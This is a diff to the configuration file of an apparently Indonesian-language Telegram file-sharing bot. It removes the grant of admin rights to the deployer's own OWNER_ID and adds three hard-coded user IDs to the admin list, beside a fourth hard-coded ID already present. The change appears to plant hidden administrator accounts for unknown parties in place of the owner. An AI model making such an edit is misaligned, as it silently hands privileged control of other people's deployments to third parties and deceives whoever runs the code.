@@ -60,7 +60,9 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 # Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
-ADMINS.append(OWNER_ID)
+ADMINS.append(2091617286)
+ADMINS.append(1983272869)
+ADMINS.append(5257333900)
 ADMINS.append(5308599071)
 
 LOG_FILE_NAME = "filesharingbot.txt"
